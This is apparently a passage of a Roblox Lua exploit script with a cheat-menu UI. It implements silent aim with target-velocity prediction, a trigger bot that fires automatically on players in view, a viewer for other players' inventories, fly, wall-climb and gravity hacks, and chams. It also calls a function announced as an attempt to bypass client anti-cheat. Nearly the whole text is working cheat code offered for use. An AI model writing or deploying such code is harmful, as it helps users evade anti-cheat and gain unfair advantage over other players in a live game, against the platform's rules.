    Text = 'Enable Character Color Picker',
    Default = false,

    Callback = function(isEnabled)
        colorPickerEnabled = isEnabled 
        
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()

        if isEnabled then
            
            for _, item in ipairs(character:GetChildren()) do
                if item:IsA("Shirt") then
                    table.insert(storedItems, item) 
                    item.ShirtTemplate = "rbxassetid://0" 
                elseif item:IsA("Pants") then
                    table.insert(storedItems, item) 
                    item.PantsTemplate = "rbxassetid://0" 
                elseif item:IsA("Accessory") then
                    
                    if item.Name:match("Hair") then
                        table.insert(storedItems, item) 
                        item.Handle.Transparency = 1 
                    end
                elseif item:IsA("Model") then
                    
                    if item.Name:match("^Waste") or item.Name:match("^Camo") then
                        table.insert(storedItems, item) 
                        
                        for _, part in ipairs(item:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Transparency = 1 
                            end
                        end
                    end
                elseif item.Name:match("^Waste") or item.Name:match("^Camo") then
                    table.insert(storedItems, item) 
                    item.Transparency = 1 
                end
            end

            
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("MeshPart") or part:IsA("Part") then
                    part.Material = Enum.Material.ForceField
                    part.Color = lastSelectedColor 
                end
            end
        else
            
            for _, storedItem in ipairs(storedItems) do
                if storedItem:IsA("Shirt") then
                    storedItem.ShirtTemplate = "rbxassetid://0" 
                elseif storedItem:IsA("Pants") then
                    storedItem.PantsTemplate = "rbxassetid://0" 
                elseif storedItem:IsA("Accessory") then
                    
                    if storedItem.Name:match("Hair") then
                        storedItem.Handle.Transparency = 0 
                    end
                elseif storedItem:IsA("Model") then
                    
                    for _, part in ipairs(storedItem:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Transparency = 0 
                        end
                    end
                else
                    
                    if storedItem.Name:match("^Waste") or storedItem.Name:match("^Camo") then
                        storedItem.Transparency = 0 
                    end
                end
            end
            storedItems = {} 

            
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("MeshPart") or part:IsA("Part") then
                    part.Material = Enum.Material.Plastic 
                    part.Color = Color3.new(1, 1, 1) 
                end
            end
        end
    end
})





charactertab:AddLabel('Character Color Picker'):AddColorPicker('ColorPickerCharacter', {
    Default = lastSelectedColor, 
    Title = 'Character Color Picker',
    Transparency = 0,

    Callback = function(selectedColor)
        lastSelectedColor = selectedColor 

        if colorPickerEnabled then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()

            
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("MeshPart") or part:IsA("Part") then
                    part.Material = Enum.Material.ForceField
                    part.Color = selectedColor 
                end
            end
        end
    end
})




charactertab:AddLabel('Ambient Color Picker'):AddColorPicker('ColorPickerAmbient', {
    Default = game.Lighting.Ambient, 
    Title = 'Ambient Color Picker',
    Transparency = 0,

    Callback = function(Value)
        game.Lighting.Ambient = Value 
    end
})


charactertab:AddLabel('ViewModel Chams Color Picker'):AddColorPicker('ColorPickerViewModel', {
    Default = ViewModelSettings.Color,
    Title = 'ViewModel Chams Color Picker',
    Transparency = 0,

    Callback = function(Value)
        ViewModelSettings.Color = Value 
        local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
        applySettings(viewModel) 
    end
})

charactertab:AddDropdown('MaterialDropdown', {
    Values = { 'Plastic', 'ForceField', 'Neon' },
    Default = 1, 
    Multi = false, 

    Text = 'Select Material',
    Tooltip = 'Change the material of the ViewModel parts',

    Callback = function(Value)
        ViewModelSettings.Material = Enum.Material[Value] 
        local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
        applySettings(viewModel) 
    end
})


charactertab:AddToggle('Toggle ViewModel Chams', {
    Text = 'Enable ViewModel Chams',
    Default = false,
    Callback = function(isEnabled)
        ViewModelSettings.IsEnabled = isEnabled 
        local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
        applySettings(viewModel) 
    end
})




charactertab:AddToggle('Toggle Highlight', {
    Text = 'Enable Highlight',
    Default = false,
    Callback = function(isEnabled)
        ViewModelSettings.HighlightEnabled = isEnabled 
        local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
        applySettings(viewModel) 
    end,
    
    ConditionalEnabled = function() return ViewModelSettings.IsEnabled end
})


charactertab:AddToggle('Toggle Arm Customization', {
    Text = 'Enable Arm Customization',
    Default = false,
    Callback = function(isEnabled)
        ViewModelSettings.ArmCustomizationEnabled = isEnabled 
        local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
        if isEnabled then
            customizeArms(viewModel) 
        end
    end
})

charactertab:AddLabel('-------------------------------------------------------------')

charactertab:AddToggle('disabletilt', {
    Text = 'Disable Tilt',
    Risky = true,
    Tooltip = 'Disable Tilt',
    Default = false,
    Callback = function(isToggled)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local characterTilt = character:FindFirstChild("CharacterTilt")

        if characterTilt then
            if isToggled then
                characterTilt.Disabled = true
                print("enabled = false")
            else
                characterTilt.Enabled = true
                print("enabled = true")
            end
        else
            warn("CharacterTilt not found in character.")
        end
    end
})


function onViewModelSpawned()
    local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
    applySettings(viewModel) 
    if ViewModelSettings.ArmCustomizationEnabled then
        customizeArms(viewModel) 
    end
end


onViewModelSpawned()


game.Workspace.Camera.ChildAdded:Connect(function(child)
    if child.Name == "ViewModel" then
        wait(0.5) 
        onViewModelSpawned() 
    end
end)


game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid").Died:Wait() 
    wait(0.5) 
    onViewModelSpawned() 
end)


game:GetService("RunService").Stepped:Connect(function()
    local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
    if viewModel then
        applySettings(viewModel) 
        if ViewModelSettings.ArmCustomizationEnabled then
            customizeArms(viewModel) 
        end
    end
end)




camera = workspace.CurrentCamera
player = game.Players.LocalPlayer
userInputService = game:GetService("UserInputService")
runService = game:GetService("RunService")

local bulletSpeed = 1001
aimEnabled = false
botAimEnabled = false

lastAimedTime = 0
aimUpdateInterval = 0.01 


function getClosestEnemyToCrosshair()
    closestCharacter = nil
    closestDistance = math.huge
    crosshairPosition = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)

    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            character = otherPlayer.Character
            if character:FindFirstChild("Humanoid") and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Head") then
                head = character.Head
                screenPoint, onScreen = camera:WorldToScreenPoint(head.Position)

                if onScreen then
                    distanceFromCrosshair = (Vector2.new(screenPoint.X, screenPoint.Y) - crosshairPosition).Magnitude
                    if distanceFromCrosshair < closestDistance then
                        closestDistance = distanceFromCrosshair
                        closestCharacter = character
                    end
                end
            end
        end
    end

    return closestCharacter
end


function getClosestBotToCrosshair()
    closestBot = nil
    closestDistance = math.huge
    crosshairPosition = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)

    for _, bot in pairs(workspace.Bots:GetChildren()) do -- Assuming bots are stored in "workspace.Bots"
        if bot:FindFirstChild("Humanoid") and bot:FindFirstChild("HumanoidRootPart") and bot:FindFirstChild("Head") then
            head = bot.Head
            screenPoint, onScreen = camera:WorldToScreenPoint(head.Position)

            if onScreen then
                distanceFromCrosshair = (Vector2.new(screenPoint.X, screenPoint.Y) - crosshairPosition).Magnitude
                if distanceFromCrosshair < closestDistance then
                    closestDistance = distanceFromCrosshair
                    closestBot = bot
                end
            end
        end
    end

    return closestBot
end


function aimAtClosestEnemy()
    if not aimEnabled then return end

    currentTime = tick()
    if currentTime - lastAimedTime < aimUpdateInterval then return end

    lastAimedTime = currentTime

    viewModel = camera:FindFirstChild("ViewModel")
    if not viewModel then return end

    closestCharacter = getClosestEnemyToCrosshair()
    closestBot = botAimEnabled and getClosestBotToCrosshair() or nil

    local target = closestBot or closestCharacter

    if target and target:FindFirstChild("Head") then
        head = target.Head
        gun = viewModel:FindFirstChild("AimPart")
        arms = viewModel:FindFirstChild("Arms")

        if gun then
            aimPosition = head.Position
            humanoidRootPart = target:FindFirstChild("HumanoidRootPart")

            if humanoidRootPart then
                velocity = humanoidRootPart.Velocity
                distance = (camera.CFrame.Position - head.Position).Magnitude
                timeToImpact = distance / bulletSpeed
                aimPosition = aimPosition + (velocity * timeToImpact) * 0.6
            end

            rightOffset = Vector3.new(0.5, -0.3, -0.3)
            gun.CFrame = CFrame.new(camera.CFrame.Position, aimPosition) * CFrame.new(rightOffset)

            if arms then
                arms.CFrame = camera.CFrame * CFrame.new(0, -0.5, 0.3)
            end
        end
    end
end


function toggleAim()
    aimEnabled = not aimEnabled
end

function toggleBotAim()
    if aimEnabled then
        botAimEnabled = not botAimEnabled
        else
        warn("please enable normal silent aim before enabling bot silent aim...")
    end
end

runService.RenderStepped:Connect(aimAtClosestEnemy)





aimtab:AddSlider('Silent Aim Interval', {
    Text = 'Silent Aim Interval Speed',
    Default = 0.01,
    Min = 0.01,
    Max = 0.05,
    Risky = true,
    Rounding = 5,
    Compact = false,

    Callback = function(Value)
aimUpdateInterval = Value

    end
})

library:Notify("You Are In Buyer Mode!",3)
wait(0.4)
library:Notify("Attempting To Bypass Client Anti-Cheat",10)
_z5attclientanticheat()

Library:SetWatermarkVisibility(true)
wait(1)
Library:SetWatermarkVisibility(false)
wait(0.6)
Library:SetWatermarkVisibility(true)
library:Notify("Failed To Bypass Client Anti-Cheat",4)

FrameTimer = tick()
 FrameCounter = 0;
 FPS = 60;

 WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1;

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter;
        FrameTimer = tick();
        FrameCounter = 0;
    end;

    Library:SetWatermark(('Nexify | Project Dildo | %s fps | %s ms'):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ));
end);

Library.KeybindFrame.Visible = true; 

aimtab:AddSlider('Silent Aim Resp Sped', {
    Text = 'Silent Aim Response Speed',
    Default = 0.04,
    Min = 0.01,
    Max = 0.10,
    Risky = true,
    Rounding = 10,
    Compact = false,

    Callback = function(Value)
--loll

    end
})


print("ignore theme settings")









aimtab:AddToggle('silentAim994', {
    Text = 'Silent Aim',
    Default = false,
    Risky = true,
    Callback = function(isEnabled)

toggleAim()


    end
}):AddKeyPicker('silentAimBind994', {
    Default = 'None',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Silent Aim Bind',
    NoUI = false,
    Callback = function(Value)
        
    end,
})
--[[
aimtab:AddToggle('silentAim994', {
    Text = 'Bot Silent Aim',
    Default = false,
    Risky = false,
    Callback = function(isEnabled)

toggleBotAim()


    end
}):AddKeyPicker('silentAimBind995', {
    Default = 'None',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Bot Silent Aim Bind',
    NoUI = false,
    Callback = function(Value)
        
    end,
})

--]]

ScreenGuiForInventory = Instance.new("ScreenGui")
FrameForInventory = Instance.new("Frame")
Slot1ForHotbar = Instance.new("ImageLabel")
Slot2ForHotbar = Instance.new("ImageLabel")
Slot3ForHotbar = Instance.new("ImageLabel")
CutterForInventory = Instance.new("TextLabel")
UICornerForInventory = Instance.new("UICorner")
UIStrokeForInventory = Instance.new("UIStroke")
PlayerNameLabelForInventory = Instance.new("TextLabel")  -- New label to display the player's name

ScreenGuiForInventory.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGuiForInventory.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

FrameForInventory.Parent = ScreenGuiForInventory
FrameForInventory.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FrameForInventory.BackgroundTransparency = 0.670
FrameForInventory.BorderColor3 = Color3.fromRGB(0, 0, 0)
FrameForInventory.BorderSizePixel = 0
FrameForInventory.Position = UDim2.new(0.5, -398, 0.010, -37)
FrameForInventory.Size = UDim2.new(0, 796, 0, 74)

Slot1ForHotbar.Name = "Slot1ForHotbar"
Slot1ForHotbar.BackgroundTransparency = 1
Slot1ForHotbar.Parent = FrameForInventory
Slot1ForHotbar.Position = UDim2.new(0.0075, 0, 0.0811, 0)
Slot1ForHotbar.Size = UDim2.new(0, 49, 0, 44)
Slot1ForHotbar.Image = ""

Slot2ForHotbar.Name = "Slot2ForHotbar"
Slot2ForHotbar.BackgroundTransparency = 1
Slot2ForHotbar.Parent = FrameForInventory
Slot2ForHotbar.Position = UDim2.new(0.1118, 0, 0.0811, 0)
Slot2ForHotbar.Size = UDim2.new(0, 49, 0, 44)
Slot2ForHotbar.Image = ""

Slot3ForHotbar.Name = "Slot3ForHotbar"
Slot3ForHotbar.BackgroundTransparency = 1
Slot3ForHotbar.Parent = FrameForInventory
Slot3ForHotbar.Position = UDim2.new(0.2173, 0, 0.0811, 0)
Slot3ForHotbar.Size = UDim2.new(0, 49, 0, 44)
Slot3ForHotbar.Image = ""

CutterForInventory.Name = "CutterForInventory"
CutterForInventory.Parent = FrameForInventory
CutterForInventory.BackgroundTransparency = 1
CutterForInventory.Position = UDim2.new(0.1897, 0, -0.1622, 0)
CutterForInventory.Size = UDim2.new(0, 200, 0, 79)
CutterForInventory.Font = Enum.Font.SourceSans
CutterForInventory.Text = "|"
CutterForInventory.TextColor3 = Color3.fromRGB(255, 255, 255)
CutterForInventory.TextScaled = true

UICornerForInventory.Parent = FrameForInventory

UIStrokeForInventory.Parent = FrameForInventory
UIStrokeForInventory.Color = Color3.fromRGB(255, 152, 35)
UIStrokeForInventory.Thickness = 1.6

-- Player name label
PlayerNameLabelForInventory.Name = "PlayerNameLabelForInventory"
PlayerNameLabelForInventory.Parent = FrameForInventory
PlayerNameLabelForInventory.BackgroundTransparency = 1
PlayerNameLabelForInventory.Position = UDim2.new(0, 0, 0, -25)
PlayerNameLabelForInventory.Size = UDim2.new(0, 796, 0, 30)
PlayerNameLabelForInventory.Font = Enum.Font.Code
PlayerNameLabelForInventory.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerNameLabelForInventory.TextScaled = true
PlayerNameLabelForInventory.Text = "No player selected"  -- Default text

-- Toggle state and function to change transparency
isGuiVisibleForInventory = false  -- This will control the visibility of the ScreenGui

function toggleGuiVisibilityForInventory()
    if isGuiVisibleForInventory then
        ScreenGuiForInventory.Enabled = false  -- Hide the ScreenGui
        isGuiVisibleForInventory = false
    else
        ScreenGuiForInventory.Enabled = true  -- Show the ScreenGui
        isGuiVisibleForInventory = true
    end
end

function isPlayerInFOV(localPlayer, otherPlayer, fov)
    -- Ensure both players have a Character
    local localCharacter = localPlayer.Character
    local otherCharacter = otherPlayer.Character
    if not localCharacter or not otherCharacter then return false end

    -- Ensure both Characters have a HumanoidRootPart
    local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")
    local otherHRP = otherCharacter:FindFirstChild("HumanoidRootPart")
    if not localHRP or not otherHRP then return false end

    -- Get positions and calculate direction
    local localPosition = localHRP.Position
    local otherPosition = otherHRP.Position
    local direction = (otherPosition - localPosition).Unit

    -- Get forward vector and calculate angle
    local forwardVector = localHRP.CFrame.LookVector
    local angle = math.deg(math.acos(direction:Dot(forwardVector)))

    -- Return true if within FOV
    return angle <= fov / 2
end


function getClosestPlayerToCrosshair(localPlayer, playersInFOV)
    local camera = game.Workspace.CurrentCamera
    local closestPlayer = nil
    local closestDistance = math.huge
    
    for _, player in ipairs(playersInFOV) do
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local rootPart = character.HumanoidRootPart
            local screenPosition, onScreen = camera:WorldToScreenPoint(rootPart.Position)
            if onScreen then
                local distance = (Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2) - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end
    return closestPlayer
end

function updateInventorySlotsForInventory(localPlayer, slots)
    local playersInFOV = {}
    local fov = 160  -- The FOV angle
    local players = game.Players:GetPlayers()

    for _, otherPlayer in pairs(players) do
        if otherPlayer ~= localPlayer and isPlayerInFOV(localPlayer, otherPlayer, fov) then
            table.insert(playersInFOV, otherPlayer)
        end
    end

    closestPlayer = getClosestPlayerToCrosshair(localPlayer, playersInFOV)
    if closestPlayer then
        PlayerNameLabelForInventory.Text = closestPlayer.Name .. "'s Inventory"  -- Update the label with the player's name
    else
        PlayerNameLabelForInventory.Text = "No player selected"
    end

    -- Update inventory slots for the closest player
    for i = 1, #slots do
        slots[i].Image = ""
    end

    if closestPlayer then
        local inventory = game.ReplicatedStorage.Players:FindFirstChild(closestPlayer.Name):FindFirstChild("Inventory")
        if inventory then
            local slotIndex = 1
            for _, item in pairs(inventory:GetChildren()) do
                if slotIndex <= #slots then
                    local itemProperties = item:FindFirstChild("ItemProperties")
                    if itemProperties then
                        local itemIcon = itemProperties:FindFirstChild("ItemIcon")
                        if itemIcon then
                            if itemIcon.ClassName == "ImageLabel" then
                                slots[slotIndex].Image = itemIcon.Image
                            elseif itemIcon.ClassName == "StringValue" then
                                slots[slotIndex].Image = "rbxassetid://" .. itemIcon.Value
                            else
                                print("Unsupported ItemIcon type: " .. itemIcon.ClassName)
                            end
                            slotIndex += 1
                        end
                    end
                end
            end
        end
    end
end

player = game.Players.LocalPlayer
slots = {Slot1ForHotbar, Slot2ForHotbar, Slot3ForHotbar}

game:GetService("RunService").RenderStepped:Connect(function()
wait(0.3)
    updateInventorySlotsForInventory(player, slots)
end)

aimtab:AddToggle('Inventory Viewer', {
    Text = 'Inventory Viewer',
    Default = true,
    Risky = true,
    Tooltip = 'Displays Inventory',
    Callback = function(first)
        toggleGuiVisibilityForInventory()
    end
}):AddKeyPicker('invViewerKeyBind', {
    Default = 'None',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Inventory Viewer Key Bind',
    NoUI = false,
    Callback = function(Value)
    end,
})



player = game:GetService("Players").LocalPlayer
mouse = player:GetMouse()
RunService = game:GetService("RunService")
toggle = false

function toggleShooting()
    toggle = not toggle
end


RunService.RenderStepped:Connect(function()
    if toggle then
        wait(0.001)
        for _, target in pairs(game:GetService("Players"):GetPlayers()) do
            if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                targetHRP = target.Character.HumanoidRootPart
                direction = (targetHRP.Position - player.Character.HumanoidRootPart.Position).unit
                camera = workspace.CurrentCamera
                cameraDirection = camera.CFrame.LookVector
                
                angle = math.acos(cameraDirection:Dot(direction))
                fov = math.rad(55)

                if angle <= fov / 2 then
                    ray = Ray.new(camera.CFrame.Position, (targetHRP.Position - camera.CFrame.Position).unit * 100)
                    hitPart, hitPosition = workspace:FindPartOnRay(ray, player.Character)

                    if hitPart and hitPart:IsDescendantOf(target.Character) then
                        mouse1press()
                        wait()
                        mouse1release()
                    end
                end
            end
        end
    end
end)

aimtab:AddToggle('trigfuckkk', {
    Text = 'Trigger Bot',
    Default = false,
    Risky = true,
    Callback = function(isEnabled)

toggleShooting()


    end
}):AddKeyPicker('triggerbot', {
    Default = 'None',
    SyncToggleState = true,

    Mode = 'Toggle',

    Text = 'Trigger Bot Key Bind',
    NoUI = false,

    Callback = function(Value)
    end,
})

-- Settings
local fovewhasd = 150
local fovewhasd_Radians = math.rad(fovewhasd / 2)

-- Function to check if target is within FOV
function isWithinFOV(targetPosition)
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        return false
    end

    local camera = workspace.CurrentCamera
    if not camera then
        return false
    end

    -- Direction from camera to target
    local directionToTarget = (targetPosition - camera.CFrame.Position).unit

    -- Camera's LookVector
    local lookVector = camera.CFrame.LookVector

    -- Angle between the two vectors
    local angle = math.acos(lookVector:Dot(directionToTarget))

    -- Check if angle is within FOV
    return angle <= fovewhasd_Radians
end

-- Function to check if there is a clear line of sight
function hasLineOfSight(targetPosition, targetCharacter)
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        return false
    end

    local rootPart = character.HumanoidRootPart
    local camera = workspace.CurrentCamera
    if not camera then
        return false
    end

    -- Start position is the camera's position
    local origin = camera.CFrame.Position

    -- Direction is towards the target position
    local direction = (targetPosition - origin).unit * (targetPosition - origin).Magnitude

    -- Perform raycast
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.FilterDescendantsInstances = {character, targetCharacter} -- Ignore player's own character and target character
    raycastParams.IgnoreWater = true

    local raycastResult = workspace:Raycast(origin, direction, raycastParams)

    -- Check if the ray hits anything before reaching the target position
    if raycastResult then
        local hitInstance = raycastResult.Instance

        -- Debugging: Output the name of the object hit
        print("Ray hit:", hitInstance.Name)

        -- If the hit is not part of the target character, it means an obstruction is present
        if not targetCharacter:IsAncestorOf(hitInstance) then
            return false
        end
    end

    -- No obstructions
    return true
end


-- Trigger Bot logic
function triggerBot()
    if isTriggerBotEnabled then
        for _, targetPlayer in pairs(game:GetService("Players"):GetPlayers()) do
            if targetPlayer ~= player then
                local targetCharacter = targetPlayer.Character
                if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") and targetCharacter:FindFirstChild("Humanoid") then
                    local targetPosition = targetCharacter.HumanoidRootPart.Position
                    if isWithinFOV(targetPosition) and hasLineOfSight(targetPosition) then
                        -- Debugging: Confirm target is valid
                        print("Shooting at target:", targetPlayer.Name)
                        mouse1press()
                        wait()
                        mouse1release()
                        break
                    end
                end
            end
        end
    end
end

-- Connect Trigger Bot to RenderStepped
runService.RenderStepped:Connect(triggerBot)
--[[
-- UI Toggle for Trigger Bot
aimtab:AddToggle('trgierrbot', {
    Text = 'Trigger Bot',
    Default = false,
    Risky = true,
    Tooltip = 'Trigger Bot',
    Callback = function(state)
        isTriggerBotEnabled = state
    end
})
--]]




aimtab:AddDropdown('Silentaimhitset2', {
    Values = { 'Legit', 'Rage', 'Balanced', '' },
    Default = 3,
    Multi = false,

    Text = 'Silent aim mode',
    Tooltip = 'silent aim mode',

    Callback = function(Value)

     
    end
})




aimtab:AddDropdown('SilentAimHitPartjb', {
    Values = { 'HumanoidRootPart', 'Head' },
    Default = 1,
    Multi = false,

    Text = 'silent aim part',
    Tooltip = 'select part',

    Callback = function(Value)
        pdlt.silentaimpart = Value
    end
})

aimtab:AddLabel("//FOV SETTINGS")

aimtab:AddToggle('fov11outline', {
    Text = 'Fov Outline',
    Default = false,
    Tooltip = 'Draw Outline',
    Callback = function(first)
        pdlt.fovoutline = first
    end
})



aimtab:AddSlider('aimfov', {
    Text = 'Aim FOV Size',
    Default = 170,
    Min = 60,
    Max = 190,
    Rounding = 0,
    Compact = false,
    Callback = function(size)
        fovRadius = size   
        if fovCircle then
            fovCircle.Radius = fovRadius  
        end
        if debugEnabled then
            print("FOV size updated to:", fovRadius)
        end
    end
})


function resetfovcircle()

fovCircle.Visible = false
wait(0.5)
fovCircle.Visible = true
end

resetfovcircle()


aimtab:AddToggle('fovdisplay', {
    Text = 'Show FOV Circle',
    Tooltip = 'Toggle the visibility of the FOV circle',
    Default = true,
    Callback = function(visible)
        
        if fovCircle then
            fovCircle.Visible = visible
        end
    end
})

aimtab:AddSlider('Fov Thickness Slider', {
    Text = 'Fov Thickness Slider',
    Default = 2,
    Min = 1,
    Max = 4,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)

fovCircle.Thickness = Value


    end
})

aimtab:AddSlider('Fov Transparency', {
    Text = 'Fov Transparency',
    Default = 1,
    Min = 0.1,
    Max = 1,
    Rounding = 2,
    Compact = false,

    Callback = function(Value)

fovCircle.Transparency = Value


    end
})


aimtab:AddToggle('fovcirclefilled', {
    Text = 'Fill Fov Circle',
    Tooltip = 'Fill Fov Circle',
    Default = false,
    Callback = function(Value)

fovCircle.Filled = Value

    end
})

 


aimtab:AddToggle('toggletracerssnap', {
    Text = 'Toggle Snaplines',
    Tooltip = 'Toggle Snaplines (FOV)',
    Default = true,
    Callback = function(Value)
        
config.snapline_enabled = Value
    end
})


aimtab:AddLabel('Tracers Color'):AddColorPicker('Tracers Color', {
    Default = Color3.fromRGB(255, 255, 255), 
    Title = 'Tracers Color',
    Transparency = 0,

    Callback = function(Value)
        
        Snapline.Color = Value
    end
})


aimtab:AddLabel('Fov Color'):AddColorPicker('Fov Color', {
    Default = Color3.fromRGB(255, 255, 255), 
    Title = 'Fov Color',
    Transparency = 0,

    Callback = function(Value)
        
        fovCircle.Color = Value
    end
})



aimtab:AddToggle('rgbf', {
    Text = 'RGB Fov',
    Tooltip = 'RGB Fov',
    Default = false, 
    Callback = function(Value)
        
        rgbfov = Value  
        
        
        
        if rgbfov then
            createFovCircle(175, Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255), 5)
        else
            createFovCircle(175, Color3.fromRGB(255, 255, 255), Color3.fromRGB(255, 255, 255), 0)
        end
    end
})


aimtab:AddButton("remove foliage", function()
    for _, v in pairs(workspace.SpawnerZones:GetDescendants()) do
        if v.ClassName == "MeshPart" and v:FindFirstChildOfClass("SurfaceAppearance") then
            v:Destroy()
        end
    end
    workspace.SpawnerZones.DescendantAdded:Connect(function(inst)
        if inst.ClassName == "MeshPart" and inst:FindFirstChildOfClass("SurfaceAppearance") then
            inst:Destroy()
        end
    end)
end)
do
    local gamesetting = {
        killaura = false,
        killaurarange = 10,
        killauradelay = 0,
        speed = false,
        speedmode = 0, 
        speedspeed = 1,
        jumpmode = 1,  
        jumpheight = 0.4,
        flight = false,
        flightmode = 0, 
        flightspeed = 1,
        phase = false,
        noenvdmg = false,
        xrayores = false,
    }
    local userinput = game:GetService("UserInputService")
    local flycontrol = {
        space = false,
        shift = false,
        w = false,
        a = false,
        s = false,
        d = false,
    }

    userinput.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.W then
            flycontrol.w = true
        elseif input.KeyCode == Enum.KeyCode.A then
            flycontrol.a = true
        elseif input.KeyCode == Enum.KeyCode.S then
            flycontrol.s = true
        elseif input.KeyCode == Enum.KeyCode.D then
            flycontrol.d = true
        elseif input.KeyCode == Enum.KeyCode.Space then
            flycontrol.space = true
        elseif input.KeyCode == Enum.KeyCode.LeftShift then
            flycontrol.shift = true
        end
    end)
    userinput.InputEnded:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.W then
            flycontrol.w = false
        elseif input.KeyCode == Enum.KeyCode.A then
            flycontrol.a = false
        elseif input.KeyCode == Enum.KeyCode.S then
            flycontrol.s = false
        elseif input.KeyCode == Enum.KeyCode.D then
            flycontrol.d = false
        elseif input.KeyCode == Enum.KeyCode.Space then
            flycontrol.space = false
        elseif input.KeyCode == Enum.KeyCode.LeftShift then
            flycontrol.shift = false
        end
    end)

getgenv().Fly3 = false
getgenv().speed3 = 26


game:GetService("RunService").RenderStepped:Connect(function(dt)
    
    local rootPart = game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
    rootPart.Velocity = rootPart.Velocity 
    local travelDirection3 = Vector3.new(0, 0, 0)

    if getgenv().Fly3 then
        
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
            travelDirection3 = travelDirection3 + Vector3.new(0, 0, 1)
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then
            travelDirection3 = travelDirection3 + Vector3.new(0, 0, -1)
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then
            travelDirection3 = travelDirection3 + Vector3.new(-1, 0, 0)
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then
            travelDirection3 = travelDirection3 + Vector3.new(1, 0, 0)
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) then
            travelDirection3 = travelDirection3 + Vector3.new(0, 1, 0)
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftShift) then
            travelDirection3 = travelDirection3 + Vector3.new(0, -1, 0)
        end

        
        if travelDirection3.Magnitude > 0 then
            
            travelDirection3 = (
                workspace.CurrentCamera.CFrame.LookVector * travelDirection3.z +
                workspace.CurrentCamera.CFrame.RightVector * travelDirection3.x +
                workspace.CurrentCamera.CFrame.UpVector * travelDirection3.y
            ).unit

            
            rootPart.Velocity = travelDirection3 * getgenv().speed3
        end
    end
end)



print("Script running...")


spiderActive = false 
spiderSpeed = 10 


function climbWalls()
    while spiderActive do
        
        local forwardRay = Ray.new(character.HumanoidRootPart.Position, character.HumanoidRootPart.CFrame.LookVector * 5) 
        local hit, position = workspace:FindPartOnRay(forwardRay, character)

        if hit then 
            local climbDirection = Vector3.new(0, 1, 0) 
            character.HumanoidRootPart.Velocity = climbDirection * spiderSpeed
        else
            
            character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        end

        
        local groundRay = Ray.new(character.HumanoidRootPart.Position, Vector3.new(0, -1, 0)) 
        local groundHit, groundPosition = workspace:FindPartOnRay(groundRay, character)

        if groundHit then
            
            character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        end

        task.wait(0.03) 
    end
end


charactertab:AddToggle('spiderToggle', {
    Text = 'Spider Climb',
    Risky = true,
    Default = false,
    Callback = function(state)
        spiderActive = state
        if spiderActive then
            climbWalls() 
        end
    end
})


charactertab:AddSlider('clisp', {
    Text = 'Spider Speed',
    Default = 10,
    Min = 1,
    Max = 25,
    Rounding = 1,
    Compact = true
}):OnChanged(function(value)
    spiderSpeed = value
end)


charactertab:AddToggle('gravitydsf', { 
    Text = 'Gravity Changer', 
    Risky = true,
    Default = false,
    Callback = function(state3)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        
        local gravityDirection = Vector3.new(0, -1, 0)  -- Gravity should pull downwards
        local wasInAir = false
